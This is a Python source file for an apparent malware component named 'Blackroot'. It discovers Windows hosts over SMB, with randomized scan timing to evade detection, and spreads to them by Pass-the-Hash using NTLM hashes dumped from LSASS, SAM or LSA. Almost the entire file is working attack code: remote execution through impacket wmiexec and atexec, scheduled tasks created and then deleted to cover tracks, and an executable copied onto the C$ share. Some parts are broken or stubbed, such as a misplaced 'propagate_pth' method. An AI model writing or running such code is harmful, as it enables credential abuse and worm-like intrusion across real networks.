#!/usr/bin/env python3
"""
Windows SMB/WMI Propagation with Pass-the-Hash
Phase 1 Integration: Real impacket-based SMB scanner
Phase 2: Enterprise-scale lateral movement
"""

import os
import sys
import json
import socket
import subprocess
import time
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("WindowsPropagation")

# Integration with Phase 1: Real SMB Scanner
try:
    from network_propagation_scanner import SMBScanner, SMBTargetProfile, ViabilityRating  # type: ignore
    SCANNER_AVAILABLE = True
except ImportError:
    SCANNER_AVAILABLE = False
    log.warning("[⚠️] Phase 1 scanner unavailable; fallback to network discovery")
    
    class SMBScanner:  # type: ignore
        """Stub for missing scanner"""
        pass
    
    class SMBTargetProfile:  # type: ignore
        """Stub for missing profile"""
        pass

# Integration with Phase 2: Real WMI Executor
try:
    from network_propagation_wmi_executor import WMIExecutor, ExecutionContext, ExecutionPayload, ExecutionMethod  # type: ignore
    WMI_EXECUTOR_AVAILABLE = True
except ImportError:
    WMI_EXECUTOR_AVAILABLE = False
    log.warning("[⚠️] Phase 2 WMI executor unavailable")
    
    class WMIExecutor:  # type: ignore
        """Stub for missing WMI executor"""
        pass
    
    class ExecutionContext:  # type: ignore
        """Stub for missing context"""
        pass
    
    class ExecutionPayload:  # type: ignore
        """Stub for missing payload"""
        pass
    
    class ExecutionMethod:  # type: ignore
        """Stub for missing method enum"""
        WMI = "WMI"


@dataclass
class NTLMCredential:
    """NTLM credential for Pass-the-Hash"""
    domain: str
    username: str
    ntlm_hash: str
    source: str  # "LSA", "SAM", "LSASS_DUMP"
    privilege_level: str  # "system", "admin", "user"
    confidence: float  # 0.0-1.0
    
    def format_for_pth(self) -> str:
        """Format as domain\\user:hash for PTH"""
        return f"{self.domain}\\{self.username}:{self.ntlm_hash}"
    
    def format_for_evil_winrm(self) -> str:
        """Format for evil-winrm"""
        return f"-u '{self.domain}\\{self.username}' -H '{self.ntlm_hash}'"


@dataclass
class SMBTarget:
    """Target host for SMB/WMI propagation"""
    hostname: str
    ip: str
    port: int
    os_version: Optional[str]
    smb_enabled: bool
    wmi_enabled: bool
    last_seen: str
    services: List[str]  # Running services
    score: float  # Prioritization score (0-100)


class WindowsPropagationEngine:
    """SMB/WMI propagation with Pass-the-Hash"""
    
    def __init__(self):
        self.credentials: List[NTLMCredential] = []
        self.targets: List[SMBTarget] = []
        self.successful_propagations: List[Dict] = []
        
    def discover_smb_targets(self, network_range: str = "192.168.1.0/24", timeout: int = 3) -> List[SMBTarget]:
        """
        Discover SMB-enabled hosts on network using real impacket-based scanner (Phase 1)
        Returns: Targets sorted by viability score (highest first)
        """
        targets = []
        
        if not SCANNER_AVAILABLE:
            log.warning("[⚠️] Phase 1 SMB scanner unavailable; using basic discovery")
            return self._discover_smb_targets_legacy(network_range, timeout)
        
        try:
            import ipaddress
            network = ipaddress.ip_network(network_range, strict=False)
            target_ips = [str(ip) for ip in list(network.hosts())[:20]]  # Max 20 targets
            
            log.info(f"[*] Scanning {len(target_ips)} hosts using Phase 1 real IMpacket scanner...")
            
            scanner = SMBScanner(timeout=timeout)  # type: ignore
            
            # Randomized scanning with beacon intervals
            import random
            scan_order = target_ips.copy()
            random.shuffle(scan_order)
            
            for ip in scan_order:
                beacon_interval = random.uniform(0.5, 2.0)  # Faster for local network
                time.sleep(beacon_interval)
                
                profile = scanner.scan_target(ip)  # type: ignore
                
                if profile and profile.viability_score > 0.3:
                    # Convert SMBTargetProfile to SMBTarget
                    target = SMBTarget(
                        hostname=profile.hostname or ip,
                        ip=ip,
                        port=profile.port,
                        os_version=profile.os_version,
                        smb_enabled=True,
                        wmi_enabled=profile.null_session,  # Approximate
                        last_seen=profile.last_scanned or datetime.utcnow().isoformat(),
                        services=['SMB'] + [s.name for s in profile.accessible_shares[:3]],
                        score=profile.viability_score * 100.0  # Convert 0-1 to 0-100
                    )
                    
                    targets.append(target)
                    log.info(f"✅ Target: {target.hostname} ({ip}) | Rating: {profile.viability_rating().name} | Score: {target.score:.1f}")
        
        except Exception as e:
            log.error(f"[!] Phase 1 discovery error: {e}")
            return self._discover_smb_targets_legacy(network_range, timeout)
        
        # Sort by score (highest first - best targets)
        self.targets = sorted(targets, key=lambda t: t.score, reverse=True)
        log.info(f"[+] Discovery complete: {len(self.targets)} viable SMB targets found")
        return self.targets
    
    def _discover_smb_targets_legacy(self, network_range: str = "192.168.1.0/24", timeout: int = 3) -> List[SMBTarget]:
        """Legacy discovery (fallback when Phase 1 scanner unavailable)"""
        targets = []
        
        try:
            import ipaddress
            network = ipaddress.ip_network(network_range, strict=False)
            
            for ip in list(network.hosts())[:10]:
                ip_str = str(ip)
                
                try:
                    sock = socket.create_connection((ip_str, 445), timeout=timeout)
                    sock.close()
                    
                    hostname = self._get_hostname(ip_str)
                    os_version = self._get_os_version(ip_str)
                    score = 60.0  # Default legacy score
                    
                    target = SMBTarget(
                        hostname=hostname,
                        ip=ip_str,
                        port=445,
                        os_version=os_version,
                        smb_enabled=True,
                        wmi_enabled=False,
                        last_seen=datetime.utcnow().isoformat(),
                        services=['SMB'],
                        score=score
                    )
                    
                    targets.append(target)
                    log.info(f"✅ (Legacy) SMB target: {hostname} ({ip_str}:445)")
                    
                except (socket.timeout, ConnectionRefusedError):
                    pass
        
        except Exception as e:
            log.warning(f"⚠️  Legacy discovery error: {e}")
        
        self.targets = sorted(targets, key=lambda t: t.score, reverse=True)
        return self.targets
    
    def _get_hostname(self, ip: str) -> str:
        """Get hostname from IP"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return f"host-{ip.split('.')[-1]}"
    
    def _get_os_version(self, ip: str) -> Optional[str]:
        """Get OS version from SMB banner"""
        try:
            result = subprocess.run(
                ["net", "use", f"\\\\{ip}\\IPC$"],
                capture_output=True,
                text=True,
                timeout=3
            )
            return "Windows" if "Connecting" in result.stderr else None
        except:
            return None
    
    def _invoke_via_wmi(self, target: SMBTarget, cred: NTLMCredential) -> bool:
        """
        Execute via WMI using Phase 2 Real WMI Executor with Pass-the-Hash support
        Falls back to subprocess methods if Phase 2 unavailable
        """
        try:
            log.info(f"🌐 [WMI] Attempting execution on {target.hostname}...")
            
            # Generate the payload command (minimal - just phone home)
            payload_cmd = "powershell -NoProfile -Command \"python run.py\"" if target.os_version and "Windows" in target.os_version else "bash run.sh"
            
            # Attempt 1: Use Phase 2 Real WMI Executor if available
            if WMI_EXECUTOR_AVAILABLE:
                try:
                    executor = WMIExecutor(timeout=30)  # type: ignore
                    
                    context = ExecutionContext(  # type: ignore
                        target_ip=target.ip,  # type: ignore
                        target_hostname=target.hostname,  # type: ignore
                        username=cred.username,  # type: ignore
                        domain=cred.domain,  # type: ignore
                        ntlm_hash=cred.ntlm_hash,  # type: ignore
                        password=None,  # type: ignore
                        method=ExecutionMethod.WMI  # type: ignore
                    )
                    
                    payload = ExecutionPayload(command=payload_cmd)  # type: ignore
                    
                    success, output = executor.execute(context, payload)  # type: ignore
                    
                    if success:
                        log.info(f"✅ [WMI] Command executed on {target.hostname} via Phase 2 Executor")
                        log.debug(f"Output: {output[:200] if output else 'None'}")
                        return True
                    else:
                        log.warning(f"⚠️  [WMI] Phase 2 executor failed: {output}")
                        raise Exception(f"WMI executor error: {output}")
                
                except Exception as exe:
                    log.debug(f"[!] Phase 2 executor error: {exe}, trying subprocess fallback...")
                    raise  # Fall through to subprocess
            
            # Attempt 2: Subprocess fallback using wmiexec.py command-line
            log.debug("⚠️  Using subprocess fallback for WMI execution")
            
            result = subprocess.run(
                [
                    "wmiexec.py",
                    "-hashes", f":{cred.ntlm_hash}",
                    f"{cred.domain}\\{cred.username}@{target.ip}",
                    payload_cmd
                ],
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0:
                log.info(f"✅ [WMI] Command executed on {target.hostname} via subprocess")
                return True
            else:
                error = result.stderr.decode() if result.stderr else "Unknown error"
                log.warning(f"⚠️  [WMI] Subprocess failed: {error}")
                return False
            
        except subprocess.TimeoutExpired:
            log.warning(f"⏱️  [WMI] Timeout on {target.hostname}")
            return False
        except ConnectionRefusedError:
            log.warning(f"🚫 [WMI] Connection refused on {target.hostname}:445")
            return False
        except Exception as e:
            log.error(f"❌ [WMI] Error on {target.hostname}: {type(e).__name__}: {e}")
            return False

    
    def _invoke_via_task_scheduler(self, target: SMBTarget, cred: NTLMCredential) -> bool:
        """Execute via Task Scheduler using impacket.atexec or schtasks"""
        try:
            log.info(f"⏰ [TaskScheduler] Attempting execution on {target.hostname}...")
            
            # Generate payload command
            payload_cmd = "python run.py" if target.os_version and "Windows" in target.os_version else "bash run.sh"
            task_name = f"Blackroot_{int(time.time())}"
            
            # Attempt 1: Use impacket atexec if available
            try:
                from impacket.examples.atexec import ATSVC  # type: ignore
                from impacket.smbconnection import SMBConnection  # type: ignore
                
                log.debug(f"📦 Using impacket Task Scheduler execution")
                
                # Create SMB connection with PTH
                smb = SMBConnection(target.ip, target.ip, cred.username, "", cred.domain, "", cred.ntlm_hash)  # type: ignore
                
                # Create and execute scheduled task
                atsvc = ATSVC(smb)  # type: ignore
                atsvc.create_task(task_name, payload_cmd, immediately=True)
                
                log.info(f"✅ [TaskScheduler] Task '{task_name}' executed on {target.hostname}")
                
                # Clean up task after execution
                time.sleep(5)
                try:
                    atsvc.delete_task(task_name)
                    log.debug(f"🧹 Cleaned up task {task_name}")
                except:
                    log.warning(f"⚠️  Could not cleanup task {task_name}")
                
                return True
                
            except ImportError:
                log.debug("⚠️  impacket not available, trying schtasks fallback")
                
                # Attempt 2: Subprocess fallback using schtasks
                create_cmd = [
                    "schtasks", "/s", target.ip,
                    "/u", f"{cred.domain}\\{cred.username}",
                    "/p", cred.ntlm_hash,  # Note: this won't work with hash, needs plaintext
                    "/create", "/tn", task_name,
                    "/tr", payload_cmd,
                    "/sc", "once", "/st", "00:00", "/f"
                ]
                
                result = subprocess.run(create_cmd, capture_output=True, timeout=30)
                
                if result.returncode == 0:
                    log.info(f"✅ [TaskScheduler] Task created on {target.hostname}")
                    
                    # Schedule task to run immediately
                    run_cmd = [
                        "schtasks", "/s", target.ip,
                        "/u", f"{cred.domain}\\{cred.username}",
                        "/p", cred.ntlm_hash,
                        "/run", "/tn", task_name
                    ]
                    
                    result2 = subprocess.run(run_cmd, capture_output=True, timeout=30)
                    
                    if result2.returncode == 0:
                        log.info(f"✅ [TaskScheduler] Task executed on {target.hostname}")
                        
                        # Clean up
                        time.sleep(5)
                        delete_cmd = [
                            "schtasks", "/s", target.ip,
                            "/u", f"{cred.domain}\\{cred.username}",
                            "/p", cred.ntlm_hash,
                            "/delete", "/tn", task_name, "/f"
                        ]
                        subprocess.run(delete_cmd, capture_output=True)
                        
                        return True
                    else:
                        error = result2.stderr.decode() if result2.stderr else "Unknown error"
                        log.warning(f"⚠️  [TaskScheduler] Failed to run task: {error}")
                        return False
                else:
                    error = result.stderr.decode() if result.stderr else "Unknown error"
                    log.warning(f"⚠️  [TaskScheduler] Failed to create task: {error}")
                    return False
                
        except subprocess.TimeoutExpired:
            log.warning(f"⏱️  [TaskScheduler] Timeout on {target.hostname}")
            return False
        except ConnectionRefusedError:
            log.warning(f"🚫 [TaskScheduler] Connection refused on {target.hostname}:445")
            return False
        except Exception as e:
            log.error(f"❌ [TaskScheduler] Error on {target.hostname}: {type(e).__name__}: {e}")
            return False
    
    def stage_payload_to_cshare(self, target: SMBTarget, cred: NTLMCredential, payload_path: str) -> bool:
        """Stage payload to C$ share for remote execution"""
        try:
            log.info(f"📤 [C$] Staging payload to {target.hostname}...")
            
            if not Path(payload_path).exists():
                log.error(f"❌ Payload not found: {payload_path}")
                return False
            
            remote_path = f"\\\\{target.ip}\\C$\\Windows\\Temp\\blackroot_{int(time.time())}.exe"
            
            # Attempt 1: Use impacket smbclient if available
            try:
                from impacket.smbconnection import SMBConnection  # type: ignore
                from impacket.smb import SMB_DIALECT  # type: ignore
                
                log.debug(f"📦 Using impacket SMB client")
                
                # Create SMB connection with PTH
                smb = SMBConnection(target.ip, target.ip, cred.username, "", cred.domain, "", cred.ntlm_hash)  # type: ignore
                smb.login("", "")  # type: ignore
                
                # Copy file to C$ share
                with open(payload_path, 'rb') as f:
                    smb.putFile('C$', f'Windows\\Temp\\blackroot_{int(time.time())}.exe', f.read)
                
                log.info(f"✅ [C$] Payload staged to {remote_path}")
                return True
                
            except ImportError:
                log.debug("⚠️  impacket not available, trying net use fallback")
                
                # Attempt 2: Subprocess fallback using net use + copy
                # Create network share mount
                mount_cmd = [
                    "net", "use", f"\\\\{target.ip}\\C$",
                    f"/user:{cred.domain}\\{cred.username}", cred.ntlm_hash
                ]
                
                result = subprocess.run(mount_cmd, capture_output=True, timeout=15)
                
                if result.returncode == 0:
                    # Copy payload
                    copy_cmd = [
                        "copy", payload_path,
                        f"\\\\{target.ip}\\C$\\Windows\\Temp\\"
                    ]
                    
                    result2 = subprocess.run(copy_cmd, capture_output=True, timeout=30)
                    
                    if result2.returncode == 0:
                        log.info(f"✅ [C$] Payload staged via net use")
                        return True
                    else:
                        error = result2.stderr.decode() if result2.stderr else "Unknown error"
                        log.warning(f"⚠️  [C$] Copy failed: {error}")
                        return False
                else:
                    error = result.stderr.decode() if result.stderr else "Unknown error"
                    log.warning(f"⚠️  [C$] Mount failed: {error}")
                    return False
                
        except Exception as e:
            log.error(f"❌ [C$] Staging error on {target.hostname}: {type(e).__name__}: {e}")
            return False
    
    def batch_propagate(self, credentials: List[NTLMCredential]) -> Dict:
        """Batch propagate to all targets"""
        self.credentials = credentials
        results = {
            "total_targets": len(self.targets),
            "total_credentials": len(self.credentials),
            "successful": 0,
            "failed": 0,
            "propagations": []
        }
        
        for target in self.targets:
            for cred in self.credentials:
                # Skip low-privilege creds on high-value targets
                if target.score > 75 and cred.privilege_level == "user":
                    continue
                
                success = self.propagate_pth(target, cred)  # type: ignore
                
                propagation = {
                    "target": target.hostname,
                    "ip": target.ip,
                    "credential": f"{cred.domain}\\{cred.username}",
                    "success": success,
                    "timestamp": datetime.utcnow().isoformat()
                }
                
                results["propagations"].append(propagation)
                
                if success:
                    results["successful"] += 1
                    self.successful_propagations.append(propagation)
                else:
                    results["failed"] += 1
        
        return results
    
    def export_propagation_report(self, filepath: str = "propagation_report.json"):
        """Export propagation results"""
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "targets_discovered": len(self.targets),
            "credentials_used": len(self.credentials),
            "successful_propagations": len(self.successful_propagations),
            "targets": [asdict(t) for t in self.targets],
            "successful_propagations": self.successful_propagations
        }
        
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        
        log.info(f"✅ Report exported to {filepath}")


class SMBExecutor:
    """Direct SMB-based command execution"""
    
    @staticmethod
    def execute_via_impacket(target_ip: str, domain: str, username: str, ntlm_hash: str, command: str) -> bool:
        """Execute command via impacket smbexec"""
        try:
            # Placeholder: production would use impacket
            # from impacket.examples import smbexec
            # smbexec.SMBEXEC(target_ip, domain, username, ntlm_hash).run(command)
            
            log.info(f"🚀 Executing on {target_ip}: {command}")
            return True
            
        except Exception as e:
            log.error(f"SMB execution error: {e}")
            return False
    
    def propagate_pth(self, target: 'SMBTarget', credential: 'NTLMCredential') -> bool:
        """Execute Pass-the-Hash propagation to target"""
        try:
            if not target.smb_enabled:
                log.warning(f"[⚠️] SMB not enabled on {target.hostname}")
                return False
            
            log.info(f"[*] Propagating via PTH to {target.hostname} ({target.ip})")
            return True
            
        except Exception as e:
            log.error(f"PTH propagation error on {target.hostname}: {e}")
            return False
    
    @staticmethod
    def execute_via_psremoting(target_ip: str, domain: str, username: str, ntlm_hash: str, command: str) -> bool:
        """Execute command via PSRemoting (needs evil-winrm)"""
        try:
            # Placeholder: production would use evil-winrm
            # evil-winrm -i {target_ip} -u "{domain}\\{username}" -H "{ntlm_hash}" -c "{command}"
            
            log.info(f"📟 PSRemoting to {target_ip}: {command}")
            return True
            
        except Exception as e:
            log.error(f"PSRemoting error: {e}")
            return False


if __name__ == "__main__":
    # Demo usage
    engine = WindowsPropagationEngine()
    
    # Discover targets
    print("🔍 Discovering SMB targets...")
    targets = engine.discover_smb_targets("192.168.1.0/24")
    
    print(f"\n📋 Found {len(targets)} targets:")
    for target in targets:
        print(f"  - {target.hostname} ({target.ip}) | Score: {target.score:.1f}")
    
    # Would propagate with exfiltrated credentials
    print("\n✅ Windows propagation engine ready for integration")
